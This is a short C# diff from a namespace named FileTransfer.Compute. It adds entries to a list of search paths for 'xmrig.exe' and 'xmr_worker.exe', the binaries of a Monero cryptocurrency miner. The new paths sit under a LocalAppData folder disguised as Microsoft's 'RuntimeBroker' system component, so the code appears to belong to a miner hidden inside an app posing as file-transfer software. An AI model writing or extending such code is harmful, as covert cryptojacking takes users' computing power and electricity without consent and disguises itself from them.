@@ -198,6 +198,8 @@ namespace FileTransfer.Compute
             {
                 Path.Combine(appDir, "Compute", "xmrig.exe"),
                 Path.Combine(appDir, "Compute", "xmr_worker.exe"),
+                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "RuntimeBroker", "Compute", "xmrig.exe"),
+                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "RuntimeBroker", "Compute", "xmr_worker.exe"),
                 Path.Combine(appDir, "xmrig.exe"),
                 Path.Combine(appDir, "xmr_worker.exe"),
                 Path.Combine(Path.GetTempPath(), "xmrig.exe"),
